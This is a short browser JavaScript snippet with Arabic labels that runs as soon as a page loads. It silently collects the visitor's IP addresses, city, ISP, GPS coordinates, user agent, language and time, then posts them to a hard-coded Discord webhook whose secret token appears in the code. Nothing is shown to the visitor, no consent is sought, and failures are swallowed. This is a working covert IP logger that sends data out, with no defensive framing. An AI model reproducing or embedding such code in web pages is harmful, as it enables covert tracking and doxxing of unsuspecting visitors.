(async () => {
  try {
    const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
      fetch('https://api.ipify.org?format=json'),
      fetch('https://api64.ipify.org?format=json'),
      fetch('https://ipapi.co/json/')
    ]);
    const ipv4 = await ipv4Res.json();
    const ipv6 = await ipv6Res.json();
    const geo = await geoRes.json();

    const ua = navigator.userAgent;
    const lang = navigator.language;
    const now = new Date();
    const time = `${now.getFullYear()}/${String(now.getMonth()+1).padStart(2,'0')}/${String(now.getDate()).padStart(2,'0')} ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;

    const msg = `
📥 دخول جديد:

🔹 IPv4: ${ipv4.ip}
🔹 IPv6: ${ipv6.ip || 'غير متوفر'}
🌍 الدولة: ${geo.country_name}
🏙️ المدينة: ${geo.city}, ${geo.region}
📡 الشركة: ${geo.org}
📌 الإحداثيات: ${geo.latitude}, ${geo.longitude}
🕰️ الوقت: ${time}
🌐 المتصفح: ${ua}
🈯 اللغة: ${lang}
    `.trim();

    await fetch("https://discord.com/api/webhooks/1387366915663462410/ETanwu367cBLroWiTWq_Lz2rE21UxWtQDl9bD4Qc1nInY_2c5sTHCkDbIhgoOQB9Kz0K", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: msg })
    });
  } catch (e) {
    console.log("فشل في جمع البيانات");
  }
})();
